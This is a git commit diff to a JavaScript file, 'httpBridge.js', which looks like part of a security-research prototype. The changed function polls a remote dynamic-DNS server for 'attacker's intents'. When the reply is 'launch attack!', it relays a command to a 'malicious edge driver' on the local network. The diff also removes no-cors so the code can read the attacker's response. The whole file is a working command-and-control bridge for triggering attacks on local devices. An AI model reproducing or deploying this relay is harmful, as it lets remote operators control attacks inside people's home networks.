e832bdff660fb283bf3f99e17296fe125fc214fd
XueningXu <47044598+XueningXu@users.noreply.github.com>
2023-08-28 22:46:20 -0400

    1

--- httpBridge.js
+++ httpBridge.js
@@ -1,15 +1,15 @@
 function startWebhook() {
     const remoteServerUrl = 'http://remains.ddns.net:34567'; // Replace with actual remote webhook URL
-    const localServerUrl = 'http://192.168.1.182:40291'; // Replace with your local server URL
+    const localServerUrl = 'http://192.168.1.182:55083'; // Replace with your local server URL
 
     const payload = {
         message: 'Get Trigger'
     };
 
-    // Send a POST request to the remote webhook URL
+    // Send a POST request to the remote http server URL to periodically poll attacker's intents
     fetch(remoteServerUrl, {
         method: 'POST',
-        mode: 'no-cors',
+        //mode: 'no-cors',      // do not include this, because we need to decide whether to launch attack based on the response data
         headers: {
             'Content-Type': 'text/plain'
         },
@@ -18,23 +18,26 @@ function startWebhook() {
     .then(response => response.text())
     .then(data => {
         console.log('Remote server response:', data);
+        // check attacker's intent
+        if (data == "launch attack!") {
 
-        // After receiving response from remote server, send POST request to local server
-        fetch(localServerUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-                'Content-Type': 'text/plain'
-            },
-            body: 'stop attack now!\n'
-        })
-        .then(localResponse => localResponse.text())
-        .then(localData => {
-            console.log('Local server response:', localData);
-        })
-        .catch(localError => {
-            console.error('Local server error:', localError);
-        });
+            // send POST request to malicious edge driver
+            fetch(localServerUrl, {
+                method: 'POST',
+                mode: 'no-cors',  // if added this mode, it means that you only want to send data to the destination and are not interested in the response data
+                headers: {                                 // Otherwise, request can still be sent to the dest, but the response will be blocked by browser.
+                    'Content-Type': 'text/plain'
+                },
+                body: 'stop attack now!\n'
+            })
+            .then(localResponse => localResponse.text())
+            .then(localData => {
+                console.log('Local server response:', localData);
+            })
+            .catch(localError => {
+                console.error('Local server error:', localError);
+            });
+        }
     })
     .catch(error => {
         console.error('Remote server error:', error);
